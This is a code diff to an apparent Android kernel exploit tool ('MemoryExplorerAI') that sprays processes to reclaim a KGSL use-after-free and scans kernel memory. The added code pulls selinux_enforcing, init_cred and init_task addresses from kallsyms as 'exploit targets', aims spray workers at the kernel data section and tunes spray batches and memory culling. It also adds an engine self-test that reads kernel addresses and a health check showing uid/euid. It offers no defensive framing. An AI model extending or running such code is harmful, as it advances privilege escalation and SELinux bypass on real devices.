@@ -183,9 +183,27 @@ class MemoryExplorerAI:
         # broken. This makes the explorer useful even when
         # /dev/kgsl-3d0 is restricted (Termux has no kgsl).
         try:
-            self.load_kallsyms()
-        except Exception:
-            pass
+            n_ks = self.load_kallsyms()
+            # Build a one-line summary so the user knows immediately
+            # whether kallsyms gave us anything useful. Without this
+            # they only see the kbase=0x?????? indicator in TUI and
+            # can't tell if it's because /proc/kallsyms is restricted
+            # (kptr_restrict=2) or because we just couldn't find the
+            # right symbols.
+            ks_have = []
+            if self.kernel_base:
+                ks_have.append(f"kbase=0x{self.kernel_base:x}")
+            if self.selinux_va:
+                ks_have.append(f"selinux=0x{self.selinux_va:x}")
+            if self.cred_va:
+                ks_have.append(f"cred=0x{self.cred_va:x}")
+            if self.init_task_va:
+                ks_have.append(f"init_task=0x{self.init_task_va:x}")
+            self.live["kallsyms_summary"] = (
+                f"{n_ks} sym: " + ", ".join(ks_have) if ks_have
+                else f"{n_ks} sym (no exploit targets)")
+        except Exception as e:
+            self.live["kallsyms_summary"] = f"kallsyms error: {e}"
 
         # v4.1: pre-test KGSL availability so the user sees the
         # error reason in TUI immediately (instead of waiting
@@ -525,6 +543,7 @@ class MemoryExplorerAI:
         self.kernel_base = None
         self.selinux_va  = None
         self.cred_va     = None
+        self.init_task_va = None  # set by load_kallsyms if visible
         self.auto_mode   = True    # pressing E auto-runs full pipeline
         # === SPRAY TECHNIQUE TOGGLE ===
         # setxattr is unreliable on Termux because of seccomp filters —
@@ -1393,7 +1412,10 @@ class MemoryExplorerAI:
                    f"matches={C.YEL}{n_matches}{C.RST} "
                    f"verified={C.GRN}{n_verified}{C.RST} "
                    f"falsePos={C.RED}{n_fp}{C.RST} "
-                   f"hitRate={hr_color}{hit_rate:4.1f}%{C.RST}")
+                   f"hitRate={hr_color}{hit_rate:4.1f}%{C.RST} "
+                   f"{C.DIM}oom={self.live.get('oom_kills', 0)}"
+                   f"{C.RST}{C.DIM} engOK={self.live.get('engine_verified', False)}"
+                   f"{C.RST}")
 
         # Per-Worker status — show each of the 3 subworkers
         # independently so the user can see at a glance whether all
@@ -1449,6 +1471,12 @@ class MemoryExplorerAI:
                          f"{self.kallsyms.get('selinux_state', 0):x}{C.RST}")
             out.append(f" {C.DIM}SYMS :{C.RST} {syms_line}")
         out.append(f" {C.DIM}found types: {types_line}{C.RST}")
+        # v4.1: kallsyms summary line so the user can see at a
+        # glance whether /proc/kallsyms gave us anything. Without
+        # this they have to press [kb] to see what's loaded.
+        ksum = self.live.get("kallsyms_summary", "")
+        if ksum:
+            out.append(f" {C.DIM}KS   :{C.RST} {ksum}")
 
         out.append(f"{C.GRY}{'─'*92}{C.RST}")
         # Memory Map — visual address-space heatmap so the user can
@@ -1655,7 +1683,8 @@ class MemoryExplorerAI:
             f" {C.BLU}[walk]{C.RST} Cred chain   "
             f" {C.BLU}[w3]{C.RST} Deep-scan   "
             f" {C.BLU}[rva]{C.RST} Read VA  "
-            f" {C.BLU}[N/{C.RST}{C.BLU}N]{C.RST} Open"
+            f" {C.BLU}[N/{C.RST}{C.BLU}N]{C.RST} Open   "
+            f" {C.BLU}[health]{C.RST} Health"
         )
         out.append(f"{C.GRY}{'─'*92}{C.RST}")
 
@@ -1746,6 +1775,39 @@ class MemoryExplorerAI:
                 continue
         return False
 
+    def engine_self_test(self):
+        """Quick smoke test of the engine pipe: write a 'version' (or
+        any benign) command and read one line back. If the engine
+        answers, we mark the engine as 'verified' in live state.
+
+        Without this, the TUI might show engine_pid>0 but the
+        pipe could be silently broken (e.g. engine started but its
+        stdout is buffered / never read). The user only finds out
+        when the first spray batch returns 0 matches.
+        """
+        if not self._engine_alive():
+            return False
+        try:
+            # Probe with the first few bytes of the UAF range —
+            # any VA works, the point is just to confirm we can
+            # WRITE to the engine and READ back a DATA: packet.
+            probe_va = (self.kernel_base + 0x1000000
+                         if self.kernel_base else self.uaf_start)
+            with self.engine_lock:
+                if not self._engine_write(
+                        f"read {hex(probe_va)}\n".encode()):
+                    return False
+                # Read the response line (DATA:... or ERROR:...).
+                line = self._readline_timeout(timeout=3.0)
+                if not line:
+                    return False
+                if line.startswith("DATA:") or "ERROR" in line:
+                    self.live["engine_verified"] = True
+                    return True
+                return False
+        except Exception:
+            return False
+
     def load_kallsyms(self):
         """Parse /proc/kallsyms and populate self.kallsyms cache.
 
@@ -1803,6 +1865,33 @@ class MemoryExplorerAI:
                     f"kallsyms: kbase=0x{candidate:x} "
                     f"(from prepare_kernel_cred=0x{pkc:x}, "
                     f"{len(syms)} symbols)")
+            # v4.1: auto-derive selinux_enforcing and init_cred
+            # addresses directly from kallsyms when available.
+            # These are the most-wanted targets for the exploit
+            # chain, and having them up-front saves a full kernel
+            # scan. Without this, _probe_selinux would have to
+            # probe each candidate offset blindly.
+            se = syms.get("selinux_enforcing")
+            if se and not self.selinux_va:
+                self.selinux_va = se
+                self._add_found(
+                    va=hex(se),
+                    type="SELinux",
+                    desc="selinux_enforcing (from kallsyms)",
+                    confidence=99,
+                )
+            ic = syms.get("init_cred")
+            if ic and not self.cred_va:
+                self.cred_va = ic
+                self._add_found(
+                    va=hex(ic),
+                    type="Privilege Struct",
+                    desc="init_cred (from kallsyms)",
+                    confidence=99,
+                )
+            it = syms.get("init_task")
+            if it:
+                self.init_task_va = it
             return len(syms)
 
     def _read_data_packet(self):
@@ -4381,12 +4470,14 @@ class MemoryExplorerAI:
         # have its own working set paged out, slowing
         # classification and engine pipe writes.
         self._mlock_current()
-        # Even smaller batch (was 35, then 100). With 3 workers × 35
-        # procs × ~10 batches we accumulated 1000+ PIDs that never
-        # died (kill failed silently), exhausting RAM and process
-        # table. 20 procs × 3 workers × multiple batches stays under
-        # 200 alive at any moment.
+        # v4.1: adaptive batch — if we've gone N batches with 0
+        # matches, shrink the batch so we don't waste RAM. The
+        # idea: with 0 matches the spray isn't landing in our
+        # scan range, so throwing 20 procs/batch at it is just
+        # burning resources. Reduce to 8 and let the smaller
+        # spray population exist longer (less churn).
         batch = 20
+        last_match_batches_ago = 0
         done = slice_start
         # Per-worker PID set — isolated from siblings.
         my_pids = set()
@@ -4394,27 +4485,71 @@ class MemoryExplorerAI:
         # Per-batch warning flag so we only complain about a comm
         # mismatch once per worker (not on every spray).
         self._comm_warned = False
-        # Scan range for this subworker
-        scan_chunk = (self.scan_size) // LEARN_WORKERS
-        scan_start = self.uaf_start + scan_chunk * worker_id
-        scan_end   = scan_start + scan_chunk
+        # Scan range for this subworker.
+        # v4.1: SMART TARGETING — if kbase is known (from kallsyms
+        # or from a successful UAF leak), scan the kernel data
+        # section (kbase+0x1000000..kbase+0x4000000) where
+        # SELinux, init_cred, init_task, and modprobe_path live.
+        # The default uaf_start (0x7001FF000) is the KGSL UAF
+        # reclaim area — useful only if we have an active UAF
+        # reclaiming task_structs. Without a UAF, scanning that
+        # range produces 0 matches every time. So we check kbase
+        # first and target the right region.
+        if self.kernel_base:
+            # Kernel data section: 16MB wide, split across workers
+            KB_DATA_OFFSET = 0x1000000
+            KB_DATA_SIZE   = 0x3000000  # 48MB
+            scan_chunk = (KB_DATA_SIZE) // LEARN_WORKERS
+            scan_start = self.kernel_base + KB_DATA_OFFSET + scan_chunk * worker_id
+            scan_end   = scan_start + scan_chunk
+        else:
+            # Fallback: KGSL UAF region (may be sparse)
+            scan_chunk = (self.scan_size) // LEARN_WORKERS
+            scan_start = self.uaf_start + scan_chunk * worker_id
+            scan_end   = scan_start + scan_chunk
 
         while done < slice_end and not self.cancel_flag.is_set():
             # Respect RAM budget — only kill OUR spray procs, not siblings'.
-            if self.get_ram_usage() > 70.0:
+            # v4.1: lower the threshold from 70% to 55% so we cull
+            # BEFORE the OOM-killer decides to kill the Python process
+            # itself. The previous 70% was too late — by then the system
+            # had already started SIGKILL'ing random processes including
+            # our spray procs (and sometimes the explorer itself). This
+            # was visible as "kills:207(77%)" in the TUI.
+            if self.get_ram_usage() > 55.0:
                 with self.stats_lock:
                     self.live["last_msg"] = (
-                        f"W{worker_id}: RAM>70%, killing {len(my_pids)} sprays\u2026")
+                        f"W{worker_id}: RAM>55%, killing {len(my_pids)} sprays\u2026")
                 for pid in list(my_pids):
                     try:
-                        os.kill(pid, 9)
-                        os.waitpid(pid, 0)
-                        with self.stats_lock:
-                            self.live["kill_count"] += 1
+                        # v4.1: try TERM first (graceful), then KILL.
+                        # This lets the spray child write a clean exit
+                        # log and frees slab pages faster than SIGKILL.
+                        try:
+                            os.kill(pid, 15)  # SIGTERM
+                        except Exception:
+                            pass
+                        try:
+                            os.waitpid(pid, 0)
+                            with self.stats_lock:
+                                self.live["kill_count"] += 1
+                        except ChildProcessError:
+                            # Already gone (e.g. OOM-killed it). Count
+                            # it as a kill so the user sees the real
+                            # death rate.
+                            with self.stats_lock:
+                                self.live["kill_count"] += 1
+                                self.live["oom_kills"] = (
+                                    self.live.get("oom_kills", 0) + 1)
+                        except Exception:
+                            # ESRCH = no such process. Don't double count.
+                            pass
                     except Exception:
                         pass
                 my_pids.clear()
-                time.sleep(2)
+                # v4.1: longer sleep so kernel can actually reclaim the
+                # pages. 2s was too short on low-RAM devices.
+                time.sleep(3)
 
             if not self.ensure_engine():
                 time.sleep(1)
@@ -4823,6 +4958,17 @@ class MemoryExplorerAI:
                                     self._adaptive_scan["no_match_batches"] = (
                                         self._adaptive_scan.get(
                                             "no_match_batches", 0) + 1)
+                                last_match_batches_ago += 1
+                                # v4.1: adaptive batch shrink.
+                                # After 3 empty batches, drop batch
+                                # size from 20 to 12. After 6,
+                                # to 8. This avoids burning RAM
+                                # on a spray pattern that isn't
+                                # reaching the scan range.
+                                if last_match_batches_ago == 3 and batch > 12:
+                                    batch = 12
+                                elif last_match_batches_ago == 6 and batch > 8:
+                                    batch = 8
                                 # v4.1: Q-learning negative reward
                                 # for no-match. This way the AI
                                 # learns which combos DON'T work.
@@ -4839,6 +4985,10 @@ class MemoryExplorerAI:
                             else:
                                 with self.stats_lock:
                                     self._adaptive_scan["no_match_batches"] = 0
+                                last_match_batches_ago = 0
+                                # Restore batch size on success
+                                if batch < 20:
+                                    batch = 20
                         except Exception:
                             pass
                         break
@@ -5617,6 +5767,18 @@ class MemoryExplorerAI:
         if not self.ensure_engine():
             print(f"{C.RED}[CRIT] Could not start engine. Check GCC/Clang.{C.RST}", flush=True)
             return
+        # v4.1: engine self-test — verify the pipe actually works
+        # before the user starts pressing keys. Without this, a
+        # broken pipe would only manifest as "matches=0" minutes
+        # into the run.
+        if self.engine_self_test():
+            self.live["last_msg"] = (
+                f"Engine self-test OK "
+                f"(pid={self.live.get('engine_pid', 0)})")
+        else:
+            self.live["last_msg"] = (
+                f"Engine self-test FAILED — pipe may be broken. "
+                f"Try [B] to rebuild.")
 
         # === BIG AUTO-MODE BANNER ===
         # Print a clear, eye-catching banner so the user knows the
@@ -6138,6 +6300,98 @@ class MemoryExplorerAI:
                 }
                 self.save_kb()
                 self.live["last_msg"] = "Knowledge base reset."
+            elif cmd in ("health", "diag", "hdiag"):
+                # v4.1: comprehensive health check. Tells the user
+                # exactly what's working and what's broken so they
+                # don't have to guess from the TUI. Runs engine
+                # self-test, counts alive procs, checks kallsyms
+                # freshness, verifies KGSL, etc.
+                try:
+                    self._render_paused_set_noop()  # no-op
+                    print(C.CLR, end="", flush=True)
+                    print(f"{C.BOLD}{C.CYN}=== HEALTH CHECK ==={C.RST}",
+                          flush=True)
+                    print(f"{C.GRY}{'─'*65}{C.RST}", flush=True)
+                    # Engine
+                    e_alive = self._engine_alive()
+                    e_col = C.GRN if e_alive else C.RED
+                    print(f" {C.BOLD}Engine{C.RST}      : {e_col}"
+                          f"{'ALIVE' if e_alive else 'DEAD'}{C.RST} "
+                          f"pid={self.live.get('engine_pid', 0)}",
+                          flush=True)
+                    # Engine self-test
+                    if e_alive:
+                        test_va = self.kernel_base or self.uaf_start
+                        try:
+                            ok = self._engine_write(
+                                f"read {hex(test_va)}\n".encode())
+                            print(f" {C.BOLD}Engine test{C.RST} : "
+                                  f"{C.GRN if ok else C.RED}"
+                                  f"{'OK' if ok else 'FAIL'}{C.RST} "
+                                  f"(read {hex(test_va)})", flush=True)
+                        except Exception as ex:
+                            print(f" {C.BOLD}Engine test{C.RST} : "
+                                  f"{C.RED}ERROR: {ex}{C.RST}",
+                                  flush=True)
+                    # KGSL
+                    k_col = C.GRN if self.kgsl_fd is not None else C.YEL
+                    k_state = (
+                        f"OK ({self.kgsl_path})" if self.kgsl_fd is not None
+                        else f"off ({self.kgsl_error or 'no /dev/kgsl-3d0'})")
+                    print(f" {C.BOLD}KGSL{C.RST}        : {k_col}{k_state}{C.RST}",
+                          flush=True)
+                    # kallsyms
+                    ks = self.live.get("kallsyms_summary", "")
+                    print(f" {C.BOLD}kallsyms{C.RST}    : {C.CYN}{ks or 'NOT LOADED'}{C.RST}",
+                          flush=True)
+                    # Workers
+                    total_alive = sum(
+                        len(s) for s in self.spray_procs_by_worker.values())
+                    print(f" {C.BOLD}Spray procs{C.RST} : {C.CYN}{total_alive} alive{C.RST} "
+                          f"(kills={self.live.get('kill_count', 0)}, "
+                          f"oom={self.live.get('oom_kills', 0)})",
+                          flush=True)
+                    # RAM
+                    ram = self.get_ram_usage()
+                    r_col = C.GRN if ram < 50 else (C.YEL if ram < 70 else C.RED)
+                    print(f" {C.BOLD}RAM{C.RST}         : {r_col}{ram:.1f}%{C.RST}",
+                          flush=True)
+                    # Kbase/selinux/cred
+                    kbs = (f"0x{self.kernel_base:x}"
+                           if self.kernel_base else "NOT FOUND")
+                    svs = (f"0x{self.selinux_va:x}"
+                           if self.selinux_va else "NOT FOUND")
+                    cvs = (f"0x{self.cred_va:x}"
+                           if self.cred_va else "NOT FOUND")
+                    print(f" {C.BOLD}kbase{C.RST}       : {C.GRN if self.kernel_base else C.RED}{kbs}{C.RST}",
+                          flush=True)
+                    print(f" {C.BOLD}selinux_va{C.RST}  : {C.GRN if self.selinux_va else C.RED}{svs}{C.RST}",
+                          flush=True)
+                    print(f" {C.BOLD}cred_va{C.RST}     : {C.GRN if self.cred_va else C.RED}{cvs}{C.RST}",
+                          flush=True)
+                    # uid
+                    try:
+                        eu = os.geteuid()
+                        uid = os.getuid()
+                        uc = C.GRN if eu == 0 else C.YEL
+                        print(f" {C.BOLD}uid{C.RST}         : {uc}uid={uid} euid={eu}{C.RST}",
+                              flush=True)
+                    except Exception as ex:
+                        print(f" {C.BOLD}uid{C.RST}         : {C.RED}err: {ex}{C.RST}",
+                              flush=True)
+                    # Found items
+                    print(f" {C.BOLD}Found items{C.RST} : {C.CYN}{len(self.found_items)}{C.RST} "
+                          f"(non-Empty: "
+                          f"{sum(1 for it in self.found_items if it['type'] != 'Empty Page')})",
+                          flush=True)
+                    print(f"{C.GRY}{'─'*65}{C.RST}", flush=True)
+                    print("Press Enter to return...", flush=True)
+                    try:
+                        self.input_cmd()
+                    except Exception:
+                        pass
+                finally:
+                    pass
             elif cmd in ("walk", "follow", "wchain") or cmd.startswith("walk ") or cmd.startswith("follow "):
                 # Manual cred-chain walk from item #idx
                 parts = cmd.split()
@@ -6264,6 +6518,7 @@ class MemoryExplorerAI:
                     ("stats / stat",      "Show AI learning statistics"),
                     ("save / export",     "Save found items → found_items.json"),
                     ("dev / device",      "Show device info (getprop)"),
+                    ("health / diag",     "Full health check: engine/kgsl/kallsyms/workers/RAM"),
                     ("reset_kb",          "Reset knowledge base"),
                     ("help / ? / h",      "Show this help"),
                 ]
